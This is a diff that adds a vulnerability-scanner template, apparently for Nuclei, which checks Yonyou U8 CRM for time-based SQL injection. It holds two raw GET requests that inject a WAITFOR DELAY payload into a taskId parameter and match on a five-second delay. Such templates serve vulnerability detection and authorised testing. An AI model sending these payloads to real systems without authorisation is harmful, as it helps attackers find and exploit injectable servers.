@@ -1,0 +1,28 @@
+id: YongYouU8CRM_getReportIdsByTaskId_sqlInjection
+
+info:
+  name: YongYouU8CRM_getReportIdsByTaskId_sqlInjection
+  author: iSee857
+  severity: high
+  description: YongYouU8CRM_getReportIdsByTaskId_sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+        Host: {{Host}}
+      
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+        Host: {{Host}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
